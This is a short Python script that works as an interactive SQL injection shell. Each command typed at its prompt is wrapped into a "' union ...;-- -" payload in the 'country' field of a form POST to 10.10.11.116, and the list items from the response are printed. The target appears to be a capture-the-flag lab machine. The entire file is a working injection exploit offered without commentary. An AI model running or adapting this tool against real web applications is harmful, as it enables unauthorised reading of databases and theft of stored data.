#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
from cmd import Cmd


class Term(Cmd):

    prompt = "> "

    def default(self, args):
        name = "tso"
        resp = requests.post('http://10.10.11.116/',
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data={"username": name, "country": f"' union {args};-- -"})
        soup = BeautifulSoup(resp.text, 'html.parser')
        if soup.li:
            print('\n'.join([x.text for x in soup.findAll('li')]))

    def do_quit(self, args):
        return 1

term = Term()
term.cmdloop()
